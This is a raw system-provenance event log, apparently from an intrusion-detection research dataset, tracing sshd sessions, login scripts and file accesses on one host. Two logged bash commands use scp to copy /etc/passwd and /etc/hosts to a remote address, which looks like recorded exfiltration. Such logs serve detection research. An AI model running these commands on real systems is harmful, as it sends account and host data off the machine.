1558090813.432:2271071043,F2081D99-187F-EB64-6B5E-5427CF5D291C:sshd,CHANGE_PRINCIPAL,B7E5BDA3-5D26-14A4-1BAC-FC9B1D706100,sshd,ta1-trace-2
1558090813.432:2271071042,0D8065B4-436B-0198-2291-89DCAE5B9AC9:sshd,CHANGE_PRINCIPAL,F2081D99-187F-EB64-6B5E-5427CF5D291C,sshd,ta1-trace-2
1558090813.432:2271071040,0D8065B4-436B-0198-2291-89DCAE5B9AC9:sshd,MMAP,C09E88F9-CD4F-A738-F447-46B0A095A034,/etc/passwd,ta1-trace-2
1558090813.432:2271071026,0D8065B4-436B-0198-2291-89DCAE5B9AC9:sshd,MMAP,C09E88F9-CD4F-A738-F447-46B0A095A034,/etc/passwd,ta1-trace-2
1558090813.428:2271070986,0D8065B4-436B-0198-2291-89DCAE5B9AC9:sshd,MMAP,07E87BAE-732D-D58F-383B-111629036544,/etc/shadow,ta1-trace-2
1558090813.428:2271070983,0D8065B4-436B-0198-2291-89DCAE5B9AC9:sshd,MMAP,C09E88F9-CD4F-A738-F447-46B0A095A034,/etc/passwd,ta1-trace-2
1558090813.420:2271070939,0D8065B4-436B-0198-2291-89DCAE5B9AC9:sshd,MMAP,07E87BAE-732D-D58F-383B-111629036544,/etc/shadow,ta1-trace-2
1558090813.420:2271070936,0D8065B4-436B-0198-2291-89DCAE5B9AC9:sshd,MMAP,C09E88F9-CD4F-A738-F447-46B0A095A034,/etc/passwd,ta1-trace-2
1558090813.316:2271070559,0D8065B4-436B-0198-2291-89DCAE5B9AC9:sshd,MMAP,C09E88F9-CD4F-A738-F447-46B0A095A034,/etc/passwd,ta1-trace-2
1558090813.316:2271070527,0D8065B4-436B-0198-2291-89DCAE5B9AC9:sshd,READ,573E5010-1713-BD2C-2998-A48580BDA4D4,/etc/hosts,ta1-trace-2
1558090813.316:2271070526,0D8065B4-436B-0198-2291-89DCAE5B9AC9:sshd,READ,573E5010-1713-BD2C-2998-A48580BDA4D4,/etc/hosts,ta1-trace-2
1558090813.216:2271070153,0D8065B4-436B-0198-2291-89DCAE5B9AC9:sshd,MMAP,C09E88F9-CD4F-A738-F447-46B0A095A034,/etc/passwd,ta1-trace-2
1558090813.212:2271069882,71CAC4B6-3217-A34C-AC60-0ACDBDC87D69:sshd,EXECUTE,0D8065B4-436B-0198-2291-89DCAE5B9AC9,sshd,ta1-trace-2
1558090813.208:2271069861,DEF8FC47-7A9A-FBED-6B2A-08B2189BECCD:sshd,FORK,71CAC4B6-3217-A34C-AC60-0ACDBDC87D69,sshd,ta1-trace-2
1558090765.060:2270973371,54C6F639-33A1-D54E-F5C8-3902BD9C91D6:sshd,MMAP,C09E88F9-CD4F-A738-F447-46B0A095A034,/etc/passwd,ta1-trace-2
1558090765.060:2270973274,C7C9F58E-F140-ED93-8CE9-E7D508EBCCCB:sshd,CHANGE_PRINCIPAL,54C6F639-33A1-D54E-F5C8-3902BD9C91D6,sshd,ta1-trace-2
1558090765.060:2270973273,C7C9F58E-F140-ED93-8CE9-E7D508EBCCCB:sshd,CHANGE_PRINCIPAL,C7C9F58E-F140-ED93-8CE9-E7D508EBCCCB,sshd,ta1-trace-2
1558090765.060:2270973272,54C6F639-33A1-D54E-F5C8-3902BD9C91D6:sshd,CHANGE_PRINCIPAL,C7C9F58E-F140-ED93-8CE9-E7D508EBCCCB,sshd,ta1-trace-2
1558090765.060:2270973215,54C6F639-33A1-D54E-F5C8-3902BD9C91D6:sshd,MMAP,C09E88F9-CD4F-A738-F447-46B0A095A034,/etc/passwd,ta1-trace-2
1558090764.624:2270968514,ABE1C86F-4444-1ABA-54ED-2D8AA88A62CD:bash,MMAP,C09E88F9-CD4F-A738-F447-46B0A095A034,/etc/passwd,ta1-trace-2
1558090764.624:2270968428,1AAC4582-9BD0-1C47-7E63-D0E726F8C98C:sshd,EXECUTE,ABE1C86F-4444-1ABA-54ED-2D8AA88A62CD,bash,ta1-trace-2
1558090764.620:2270968317,A7BC5BE3-B701-CE8E-44D9-D691006EA44B:sshd,FORK,1AAC4582-9BD0-1C47-7E63-D0E726F8C98C,sshd,ta1-trace-2
1558090764.620:2270968267,54C6F639-33A1-D54E-F5C8-3902BD9C91D6:sshd,MMAP,C09E88F9-CD4F-A738-F447-46B0A095A034,/etc/passwd,ta1-trace-2
1558090764.620:2270968260,54C6F639-33A1-D54E-F5C8-3902BD9C91D6:sshd,MMAP,C09E88F9-CD4F-A738-F447-46B0A095A034,/etc/passwd,ta1-trace-2
1558090764.620:2270968226,7AF94C56-349E-34B1-D853-176D4DD14338:sshd,CHANGE_PRINCIPAL,A7BC5BE3-B701-CE8E-44D9-D691006EA44B,sshd,ta1-trace-2
1558090764.620:2270968204,B6C7E582-9F73-87AB-63D4-0ED74B5EDA2F:sshd,CHANGE_PRINCIPAL,7AF94C56-349E-34B1-D853-176D4DD14338,sshd,ta1-trace-2
1558090764.620:2270968201,54C6F639-33A1-D54E-F5C8-3902BD9C91D6:sshd,FORK,B6C7E582-9F73-87AB-63D4-0ED74B5EDA2F,sshd,ta1-trace-2
1558090764.620:2270968192,54C6F639-33A1-D54E-F5C8-3902BD9C91D6:sshd,MMAP,C09E88F9-CD4F-A738-F447-46B0A095A034,/etc/passwd,ta1-trace-2
1558090764.620:2270968156,54C6F639-33A1-D54E-F5C8-3902BD9C91D6:sshd,MMAP,C09E88F9-CD4F-A738-F447-46B0A095A034,/etc/passwd,ta1-trace-2
1558090764.620:2270968153,54C6F639-33A1-D54E-F5C8-3902BD9C91D6:sshd,MMAP,C09E88F9-CD4F-A738-F447-46B0A095A034,/etc/passwd,ta1-trace-2
1558090764.620:2270968150,54C6F639-33A1-D54E-F5C8-3902BD9C91D6:sshd,MMAP,C09E88F9-CD4F-A738-F447-46B0A095A034,/etc/passwd,ta1-trace-2
1558090764.616:2270968074,8450745E-21CC-00F7-26BD-101918750995:update-motd-fsc,EXECUTE,FD3042E9-F2A5-5E44-5FB8-F1A16294FFF1,cat,ta1-trace-2
1558090764.616:2270968072,09829DAD-E3A9-215E-AAA9-EA1E5C42038D:update-motd-fsc,FORK,8450745E-21CC-00F7-26BD-101918750995,update-motd-fsc,ta1-trace-2
1558090764.616:2270967857,F3CA4376-2C12-D75A-0B6F-B5138A0C85AD:98-fsck-at-rebo,EXECUTE,09829DAD-E3A9-215E-AAA9-EA1E5C42038D,update-motd-fsc,ta1-trace-2
1558090764.612:2270967835,6F1B8D29-088E-9D93-49D6-F924E444907D:run-parts,EXECUTE,F3CA4376-2C12-D75A-0B6F-B5138A0C85AD,98-fsck-at-rebo,ta1-trace-2
1558090764.612:2270967834,F6777416-D731-C301-D7CE-F4F7586B87BD:run-parts,FORK,6F1B8D29-088E-9D93-49D6-F924E444907D,run-parts,ta1-trace-2
1558090764.612:2270967785,943300B9-F25E-2C97-17E2-659D1EA5C684:update-motd-hwe,EXECUTE,55B21ACA-4FF8-A4B6-E087-E4D00A381CF1,cat,ta1-trace-2
1558090764.612:2270967783,EE8BE375-143E-2ED5-7D3A-80F9CCCF00EB:update-motd-hwe,FORK,943300B9-F25E-2C97-17E2-659D1EA5C684,update-motd-hwe,ta1-trace-2
1558090764.592:2270966402,66BCFA3A-922E-CF17-4205-325146A52A80:95-hwe-eol,EXECUTE,EE8BE375-143E-2ED5-7D3A-80F9CCCF00EB,update-motd-hwe,ta1-trace-2
1558090764.592:2270966381,8B321825-9FD4-E3C1-0C47-EE10DCAF081A:run-parts,EXECUTE,66BCFA3A-922E-CF17-4205-325146A52A80,95-hwe-eol,ta1-trace-2
1558090764.592:2270966380,F6777416-D731-C301-D7CE-F4F7586B87BD:run-parts,FORK,8B321825-9FD4-E3C1-0C47-EE10DCAF081A,run-parts,ta1-trace-2
1558090764.572:2270966006,75D34D30-B56F-3790-4AE3-35BB55CF6172:lsb_release,MMAP,C09E88F9-CD4F-A738-F447-46B0A095A034,/etc/passwd,ta1-trace-2
1558090764.560:2270965747,724E3BE8-10DA-D21D-196E-44A9DD02CE44:91-release-upgr,EXECUTE,75D34D30-B56F-3790-4AE3-35BB55CF6172,lsb_release,ta1-trace-2
1558090764.560:2270965738,E4E03196-4557-5664-EEF0-60FA65451EF7:91-release-upgr,FORK,724E3BE8-10DA-D21D-196E-44A9DD02CE44,91-release-upgr,ta1-trace-2
1558090764.556:2270965731,F7188EE3-CA2E-D935-2B7C-77B56F3D63F0:91-release-upgr,FORK,E4E03196-4557-5664-EEF0-60FA65451EF7,91-release-upgr,ta1-trace-2
1558090764.556:2270965709,12AD9611-F765-0AE8-5EC7-D4564B8F42C1:run-parts,EXECUTE,F7188EE3-CA2E-D935-2B7C-77B56F3D63F0,91-release-upgr,ta1-trace-2
1558090764.556:2270965708,F6777416-D731-C301-D7CE-F4F7586B87BD:run-parts,FORK,12AD9611-F765-0AE8-5EC7-D4564B8F42C1,run-parts,ta1-trace-2
1558090764.556:2270965682,CF582231-CED0-AD0D-40E8-2E8AF9B63DF7:update-motd-upd,EXECUTE,3258C521-2F51-FCFF-2835-7AB0B2B7029A,cat,ta1-trace-2
1558090764.556:2270965680,3344B26C-0DD1-11EF-F0F2-DCD2961D9615:update-motd-upd,FORK,CF582231-CED0-AD0D-40E8-2E8AF9B63DF7,update-motd-upd,ta1-trace-2
1558090764.540:2270964610,A2EFC8FB-C17C-D79C-8621-9AB0DDEE0971:90-updates-avai,EXECUTE,3344B26C-0DD1-11EF-F0F2-DCD2961D9615,update-motd-upd,ta1-trace-2
1558090764.540:2270964589,8B0F13C9-130F-8135-13B3-37B514FD2F0C:run-parts,EXECUTE,A2EFC8FB-C17C-D79C-8621-9AB0DDEE0971,90-updates-avai,ta1-trace-2
1558090764.540:2270964588,F6777416-D731-C301-D7CE-F4F7586B87BD:run-parts,FORK,8B0F13C9-130F-8135-13B3-37B514FD2F0C,run-parts,ta1-trace-2
1558090764.352:2270957420,6E5F1F47-E663-94F0-B717-07250D4671BC:landscape-sysin,MMAP,C09E88F9-CD4F-A738-F447-46B0A095A034,/etc/passwd,ta1-trace-2
1558090764.340:2270956978,B87D65CA-A416-6999-E8C7-7A05EFEBFA67:50-landscape-sy,EXECUTE,6E5F1F47-E663-94F0-B717-07250D4671BC,landscape-sysin,ta1-trace-2
1558090764.340:2270956976,EB9E690F-7C1F-F98E-999C-52A7BBD58642:50-landscape-sy,FORK,B87D65CA-A416-6999-E8C7-7A05EFEBFA67,50-landscape-sy,ta1-trace-2
1558090764.336:2270956721,75094713-6F82-B763-1F7C-0ACD74CAFC6D:run-parts,EXECUTE,EB9E690F-7C1F-F98E-999C-52A7BBD58642,50-landscape-sy,ta1-trace-2
1558090764.332:2270956715,F6777416-D731-C301-D7CE-F4F7586B87BD:run-parts,FORK,75094713-6F82-B763-1F7C-0ACD74CAFC6D,run-parts,ta1-trace-2
1558090764.324:2270956377,9AF91543-75F1-FC78-42B2-A6D073B0579A:env,EXECUTE,F6777416-D731-C301-D7CE-F4F7586B87BD,run-parts,ta1-trace-2
1558090764.324:2270956325,032983E5-EFD4-15FC-0666-E4E214D86E53:sh,EXECUTE,9AF91543-75F1-FC78-42B2-A6D073B0579A,env,ta1-trace-2
1558090764.324:2270956310,C49160EB-689A-28B7-4097-6B18ED6BBA36:sh,FORK,032983E5-EFD4-15FC-0666-E4E214D86E53,sh,ta1-trace-2
1558090764.324:2270956259,708718D0-062A-ECEF-8ACC-413A2DC50066:sshd,EXECUTE,C49160EB-689A-28B7-4097-6B18ED6BBA36,sh,ta1-trace-2
1558090764.324:2270956238,54C6F639-33A1-D54E-F5C8-3902BD9C91D6:sshd,FORK,708718D0-062A-ECEF-8ACC-413A2DC50066,sshd,ta1-trace-2
1558090764.324:2270956212,54C6F639-33A1-D54E-F5C8-3902BD9C91D6:sshd,MMAP,C09E88F9-CD4F-A738-F447-46B0A095A034,/etc/passwd,ta1-trace-2
1558090764.296:2270955815,54C6F639-33A1-D54E-F5C8-3902BD9C91D6:sshd,MMAP,C09E88F9-CD4F-A738-F447-46B0A095A034,/etc/passwd,ta1-trace-2
1558090764.296:2270955763,54C6F639-33A1-D54E-F5C8-3902BD9C91D6:sshd,MMAP,C09E88F9-CD4F-A738-F447-46B0A095A034,/etc/passwd,ta1-trace-2
1558090764.296:2270955751,2D73D4D6-C6B8-93EC-921B-B26875AC8AFF:sshd,CHANGE_PRINCIPAL,54C6F639-33A1-D54E-F5C8-3902BD9C91D6,sshd,ta1-trace-2
1558090764.296:2270955750,B4133D62-97E2-C9DB-2CA3-AF77421FB46E:sshd,CHANGE_PRINCIPAL,2D73D4D6-C6B8-93EC-921B-B26875AC8AFF,sshd,ta1-trace-2
1558090764.296:2270955749,2D73D4D6-C6B8-93EC-921B-B26875AC8AFF:sshd,CHANGE_PRINCIPAL,B4133D62-97E2-C9DB-2CA3-AF77421FB46E,sshd,ta1-trace-2
1558090764.296:2270955748,54C6F639-33A1-D54E-F5C8-3902BD9C91D6:sshd,CHANGE_PRINCIPAL,2D73D4D6-C6B8-93EC-921B-B26875AC8AFF,sshd,ta1-trace-2
1558090764.296:2270955746,54C6F639-33A1-D54E-F5C8-3902BD9C91D6:sshd,MMAP,C09E88F9-CD4F-A738-F447-46B0A095A034,/etc/passwd,ta1-trace-2
1558090764.296:2270955732,54C6F639-33A1-D54E-F5C8-3902BD9C91D6:sshd,MMAP,C09E88F9-CD4F-A738-F447-46B0A095A034,/etc/passwd,ta1-trace-2
1558090764.292:2270955689,54C6F639-33A1-D54E-F5C8-3902BD9C91D6:sshd,MMAP,07E87BAE-732D-D58F-383B-111629036544,/etc/shadow,ta1-trace-2
1558090764.292:2270955685,54C6F639-33A1-D54E-F5C8-3902BD9C91D6:sshd,MMAP,C09E88F9-CD4F-A738-F447-46B0A095A034,/etc/passwd,ta1-trace-2
1558090764.284:2270955645,54C6F639-33A1-D54E-F5C8-3902BD9C91D6:sshd,MMAP,07E87BAE-732D-D58F-383B-111629036544,/etc/shadow,ta1-trace-2
1558090764.284:2270955642,54C6F639-33A1-D54E-F5C8-3902BD9C91D6:sshd,MMAP,C09E88F9-CD4F-A738-F447-46B0A095A034,/etc/passwd,ta1-trace-2
1558090764.180:2270955247,54C6F639-33A1-D54E-F5C8-3902BD9C91D6:sshd,MMAP,C09E88F9-CD4F-A738-F447-46B0A095A034,/etc/passwd,ta1-trace-2
1558090764.180:2270955204,54C6F639-33A1-D54E-F5C8-3902BD9C91D6:sshd,READ,573E5010-1713-BD2C-2998-A48580BDA4D4,/etc/hosts,ta1-trace-2
1558090764.180:2270955203,54C6F639-33A1-D54E-F5C8-3902BD9C91D6:sshd,READ,573E5010-1713-BD2C-2998-A48580BDA4D4,/etc/hosts,ta1-trace-2
1558090764.076:2270954814,54C6F639-33A1-D54E-F5C8-3902BD9C91D6:sshd,MMAP,C09E88F9-CD4F-A738-F447-46B0A095A034,/etc/passwd,ta1-trace-2
1558090764.068:2270954555,26F63B85-6EE5-1499-332F-FCA9BE7105EC:sshd,EXECUTE,54C6F639-33A1-D54E-F5C8-3902BD9C91D6,sshd,ta1-trace-2
1558090764.068:2270954534,DEF8FC47-7A9A-FBED-6B2A-08B2189BECCD:sshd,FORK,26F63B85-6EE5-1499-332F-FCA9BE7105EC,sshd,ta1-trace-2
1558090634.498:2270710567,D4153989-3D97-BC8C-180D-70E311E5BDF3:xscreensaver,MMAP,C09E88F9-CD4F-A738-F447-46B0A095A034,/etc/passwd,ta1-trace-2
1558090634.498:2270710538,D4153989-3D97-BC8C-180D-70E311E5BDF3:xscreensaver,MMAP,C09E88F9-CD4F-A738-F447-46B0A095A034,/etc/passwd,ta1-trace-2
1558090634.498:2270710509,D4153989-3D97-BC8C-180D-70E311E5BDF3:xscreensaver,MMAP,C09E88F9-CD4F-A738-F447-46B0A095A034,/etc/passwd,ta1-trace-2
1558090480.917:2270366490,18904653-D3F1-65F8-0045-99167AAD7FF0:sshd,MMAP,C09E88F9-CD4F-A738-F447-46B0A095A034,/etc/passwd,ta1-trace-2
1558090480.913:2270366368,D7944292-329E-BEEC-2EEA-1295EF5ABFDA:sshd,CHANGE_PRINCIPAL,18904653-D3F1-65F8-0045-99167AAD7FF0,sshd,ta1-trace-2
1558090480.913:2270366367,D7944292-329E-BEEC-2EEA-1295EF5ABFDA:sshd,CHANGE_PRINCIPAL,D7944292-329E-BEEC-2EEA-1295EF5ABFDA,sshd,ta1-trace-2
1558090480.913:2270366366,18904653-D3F1-65F8-0045-99167AAD7FF0:sshd,CHANGE_PRINCIPAL,D7944292-329E-BEEC-2EEA-1295EF5ABFDA,sshd,ta1-trace-2
1558090480.913:2270366332,18904653-D3F1-65F8-0045-99167AAD7FF0:sshd,MMAP,C09E88F9-CD4F-A738-F447-46B0A095A034,/etc/passwd,ta1-trace-2
1558090477.801:2270359651,F8248889-7C90-05D0-13F9-E204E1EA05C0:scp,READ,C09E88F9-CD4F-A738-F447-46B0A095A034,/etc/passwd,ta1-trace-2
1558090477.245:2270357727,18DDB61A-68AC-DBF9-E645-8634E222AB4B:ssh,MMAP,C09E88F9-CD4F-A738-F447-46B0A095A034,/etc/passwd,ta1-trace-2
1558090477.245:2270357724,18DDB61A-68AC-DBF9-E645-8634E222AB4B:ssh,MMAP,C09E88F9-CD4F-A738-F447-46B0A095A034,/etc/passwd,ta1-trace-2
1558090477.245:2270357721,18DDB61A-68AC-DBF9-E645-8634E222AB4B:ssh,MMAP,C09E88F9-CD4F-A738-F447-46B0A095A034,/etc/passwd,ta1-trace-2
1558090477.245:2270357718,18DDB61A-68AC-DBF9-E645-8634E222AB4B:ssh,MMAP,C09E88F9-CD4F-A738-F447-46B0A095A034,/etc/passwd,ta1-trace-2
1558090477.245:2270357715,18DDB61A-68AC-DBF9-E645-8634E222AB4B:ssh,MMAP,C09E88F9-CD4F-A738-F447-46B0A095A034,/etc/passwd,ta1-trace-2
1558090477.245:2270357712,18DDB61A-68AC-DBF9-E645-8634E222AB4B:ssh,MMAP,C09E88F9-CD4F-A738-F447-46B0A095A034,/etc/passwd,ta1-trace-2
1558090477.245:2270357709,18DDB61A-68AC-DBF9-E645-8634E222AB4B:ssh,MMAP,C09E88F9-CD4F-A738-F447-46B0A095A034,/etc/passwd,ta1-trace-2
1558090477.245:2270357683,18DDB61A-68AC-DBF9-E645-8634E222AB4B:ssh,MMAP,C09E88F9-CD4F-A738-F447-46B0A095A034,/etc/passwd,ta1-trace-2
1558090477.241:2270357588,74C4718C-2914-5ADB-7C33-8762DEE4D590:scp,EXECUTE,18DDB61A-68AC-DBF9-E645-8634E222AB4B,ssh,ta1-trace-2
1558090477.241:2270357579,F8248889-7C90-05D0-13F9-E204E1EA05C0:scp,FORK,74C4718C-2914-5ADB-7C33-8762DEE4D590,scp,ta1-trace-2
1558090477.241:2270357572,F8248889-7C90-05D0-13F9-E204E1EA05C0:scp,MMAP,C09E88F9-CD4F-A738-F447-46B0A095A034,/etc/passwd,ta1-trace-2
1558090477.241:2270357511,57556EC0-264D-AC03-08F9-C3E19D664018:bash,EXECUTE,F8248889-7C90-05D0-13F9-E204E1EA05C0,b'scp -r /etc/passwd admin@128.55.12.79:./files/',ta1-trace-2
1558090477.241:2270357505,E8616F0D-7171-4FE9-A01C-800B1B9EB646:bash,FORK,57556EC0-264D-AC03-08F9-C3E19D664018,bash,ta1-trace-2
1558090475.137:2270350094,733668F5-D7EB-B3C0-55BF-F977727D8F1B:scp,READ,573E5010-1713-BD2C-2998-A48580BDA4D4,/etc/hosts,ta1-trace-2
1558090474.597:2270348880,5B62A3A4-FB76-152F-8679-963A0758D64C:ssh,MMAP,C09E88F9-CD4F-A738-F447-46B0A095A034,/etc/passwd,ta1-trace-2
1558090474.593:2270348877,5B62A3A4-FB76-152F-8679-963A0758D64C:ssh,MMAP,C09E88F9-CD4F-A738-F447-46B0A095A034,/etc/passwd,ta1-trace-2
1558090474.593:2270348874,5B62A3A4-FB76-152F-8679-963A0758D64C:ssh,MMAP,C09E88F9-CD4F-A738-F447-46B0A095A034,/etc/passwd,ta1-trace-2
1558090474.593:2270348871,5B62A3A4-FB76-152F-8679-963A0758D64C:ssh,MMAP,C09E88F9-CD4F-A738-F447-46B0A095A034,/etc/passwd,ta1-trace-2
1558090474.593:2270348868,5B62A3A4-FB76-152F-8679-963A0758D64C:ssh,MMAP,C09E88F9-CD4F-A738-F447-46B0A095A034,/etc/passwd,ta1-trace-2
1558090474.593:2270348865,5B62A3A4-FB76-152F-8679-963A0758D64C:ssh,MMAP,C09E88F9-CD4F-A738-F447-46B0A095A034,/etc/passwd,ta1-trace-2
1558090474.593:2270348862,5B62A3A4-FB76-152F-8679-963A0758D64C:ssh,MMAP,C09E88F9-CD4F-A738-F447-46B0A095A034,/etc/passwd,ta1-trace-2
1558090474.593:2270348840,5B62A3A4-FB76-152F-8679-963A0758D64C:ssh,MMAP,C09E88F9-CD4F-A738-F447-46B0A095A034,/etc/passwd,ta1-trace-2
1558090474.585:2270348745,540819B1-1676-E9DA-B7E5-2CAA10CDA6B4:scp,EXECUTE,5B62A3A4-FB76-152F-8679-963A0758D64C,ssh,ta1-trace-2
1558090474.585:2270348736,733668F5-D7EB-B3C0-55BF-F977727D8F1B:scp,FORK,540819B1-1676-E9DA-B7E5-2CAA10CDA6B4,scp,ta1-trace-2
1558090474.585:2270348729,733668F5-D7EB-B3C0-55BF-F977727D8F1B:scp,MMAP,C09E88F9-CD4F-A738-F447-46B0A095A034,/etc/passwd,ta1-trace-2
1558090474.585:2270348663,3EDCA9D0-16B3-03AF-9ACE-3E3AD7511319:bash,EXECUTE,733668F5-D7EB-B3C0-55BF-F977727D8F1B,b'scp -r /etc/hosts admin@128.55.12.79:./work/',ta1-trace-2
1558090474.585:2270348649,E8616F0D-7171-4FE9-A01C-800B1B9EB646:bash,FORK,3EDCA9D0-16B3-03AF-9ACE-3E3AD7511319,bash,ta1-trace-2
1558090474.409:2270345451,E8616F0D-7171-4FE9-A01C-800B1B9EB646:bash,MMAP,C09E88F9-CD4F-A738-F447-46B0A095A034,/etc/passwd,ta1-trace-2
1558090474.409:2270345354,4E17FF9B-E97D-E551-0C8F-06C2877F5E2C:sshd,EXECUTE,E8616F0D-7171-4FE9-A01C-800B1B9EB646,bash,ta1-trace-2
1558090474.409:2270345241,89A07C9B-6CD1-A6AC-6386-CC3B7F4BD0F8:sshd,FORK,4E17FF9B-E97D-E551-0C8F-06C2877F5E2C,sshd,ta1-trace-2
1558090474.405:2270345191,18904653-D3F1-65F8-0045-99167AAD7FF0:sshd,MMAP,C09E88F9-CD4F-A738-F447-46B0A095A034,/etc/passwd,ta1-trace-2
1558090474.405:2270345185,18904653-D3F1-65F8-0045-99167AAD7FF0:sshd,MMAP,C09E88F9-CD4F-A738-F447-46B0A095A034,/etc/passwd,ta1-trace-2
1558090474.405:2270345165,4690252B-8505-32D9-B7D8-192E1882BD37:sshd,CHANGE_PRINCIPAL,89A07C9B-6CD1-A6AC-6386-CC3B7F4BD0F8,sshd,ta1-trace-2
1558090474.405:2270345143,28E1DEB9-5114-6879-2744-A2CDCF716810:sshd,CHANGE_PRINCIPAL,4690252B-8505-32D9-B7D8-192E1882BD37,sshd,ta1-trace-2
1558090474.405:2270345140,18904653-D3F1-65F8-0045-99167AAD7FF0:sshd,FORK,28E1DEB9-5114-6879-2744-A2CDCF716810,sshd,ta1-trace-2
1558090474.405:2270345131,18904653-D3F1-65F8-0045-99167AAD7FF0:sshd,MMAP,C09E88F9-CD4F-A738-F447-46B0A095A034,/etc/passwd,ta1-trace-2
1558090474.405:2270345095,18904653-D3F1-65F8-0045-99167AAD7FF0:sshd,MMAP,C09E88F9-CD4F-A738-F447-46B0A095A034,/etc/passwd,ta1-trace-2
1558090474.405:2270345092,18904653-D3F1-65F8-0045-99167AAD7FF0:sshd,MMAP,C09E88F9-CD4F-A738-F447-46B0A095A034,/etc/passwd,ta1-trace-2
1558090474.405:2270345089,18904653-D3F1-65F8-0045-99167AAD7FF0:sshd,MMAP,C09E88F9-CD4F-A738-F447-46B0A095A034,/etc/passwd,ta1-trace-2
1558090474.405:2270345013,10F2F8D5-108C-37E5-ECF4-D73AF02F531B:update-motd-fsc,EXECUTE,FFEEBCA9-2D93-9BD6-7614-7663EC68D6B5,cat,ta1-trace-2
1558090474.405:2270345011,BAE64803-DD84-1297-275E-E8048E6EBC8F:update-motd-fsc,FORK,10F2F8D5-108C-37E5-ECF4-D73AF02F531B,update-motd-fsc,ta1-trace-2
1558090474.401:2270344796,8F5F457E-6612-E0E5-A8EF-962BB99F507E:98-fsck-at-rebo,EXECUTE,BAE64803-DD84-1297-275E-E8048E6EBC8F,update-motd-fsc,ta1-trace-2
1558090474.401:2270344774,87FEF318-C0AB-BD11-C1B5-E97BFC2D16DC:run-parts,EXECUTE,8F5F457E-6612-E0E5-A8EF-962BB99F507E,98-fsck-at-rebo,ta1-trace-2
1558090474.401:2270344773,51B85202-1F69-4103-1B3A-12DCFF6969FD:run-parts,FORK,87FEF318-C0AB-BD11-C1B5-E97BFC2D16DC,run-parts,ta1-trace-2
1558090474.401:2270344724,6AD4468E-6C4B-5F81-9747-E75F17D39CAD:update-motd-hwe,EXECUTE,9842E206-A70E-D38E-E14F-AA4BE7A2AB78,cat,ta1-trace-2
1558090474.401:2270344722,D7B74D20-8B1A-80F6-55A1-B0AA34E58ABB:update-motd-hwe,FORK,6AD4468E-6C4B-5F81-9747-E75F17D39CAD,update-motd-hwe,ta1-trace-2
1558090474.381:2270343323,89AC4E7B-B8D5-46F9-290F-C112F5BB6104:95-hwe-eol,EXECUTE,D7B74D20-8B1A-80F6-55A1-B0AA34E58ABB,update-motd-hwe,ta1-trace-2
1558090474.377:2270343302,AFD54910-A126-A691-CD8D-21C880774C15:run-parts,EXECUTE,89AC4E7B-B8D5-46F9-290F-C112F5BB6104,95-hwe-eol,ta1-trace-2
1558090474.377:2270343301,51B85202-1F69-4103-1B3A-12DCFF6969FD:run-parts,FORK,AFD54910-A126-A691-CD8D-21C880774C15,run-parts,ta1-trace-2
1558090474.357:2270342937,3DD80463-435F-7592-F5A5-CD2B75A69B64:lsb_release,MMAP,C09E88F9-CD4F-A738-F447-46B0A095A034,/etc/passwd,ta1-trace-2
1558090474.349:2270342669,879A4443-D829-361E-CA14-17049AE5D2F0:91-release-upgr,EXECUTE,3DD80463-435F-7592-F5A5-CD2B75A69B64,lsb_release,ta1-trace-2
1558090474.349:2270342660,E28BBAC0-ABA1-1535-12AA-1D0D376F4219:91-release-upgr,FORK,879A4443-D829-361E-CA14-17049AE5D2F0,91-release-upgr,ta1-trace-2
1558090474.349:2270342653,E46C0D31-1502-7829-3FCD-0FC78164718B:91-release-upgr,FORK,E28BBAC0-ABA1-1535-12AA-1D0D376F4219,91-release-upgr,ta1-trace-2
1558090474.349:2270342631,3A4E637A-69BE-05FE-E4A0-EB0D6D967826:run-parts,EXECUTE,E46C0D31-1502-7829-3FCD-0FC78164718B,91-release-upgr,ta1-trace-2
1558090474.349:2270342630,51B85202-1F69-4103-1B3A-12DCFF6969FD:run-parts,FORK,3A4E637A-69BE-05FE-E4A0-EB0D6D967826,run-parts,ta1-trace-2
1558090474.349:2270342604,2AF71AEA-4BCB-7913-FA43-BC508FF87356:update-motd-upd,EXECUTE,BA081E3F-B043-44AB-40EB-8D9526A49A67,cat,ta1-trace-2
1558090474.349:2270342602,B3D8F01E-5D8A-7026-A8E7-2FBDE5099585:update-motd-upd,FORK,2AF71AEA-4BCB-7913-FA43-BC508FF87356,update-motd-upd,ta1-trace-2
1558090474.333:2270341530,6E82F256-538B-8FFC-7CD4-C83F822A2521:90-updates-avai,EXECUTE,B3D8F01E-5D8A-7026-A8E7-2FBDE5099585,update-motd-upd,ta1-trace-2
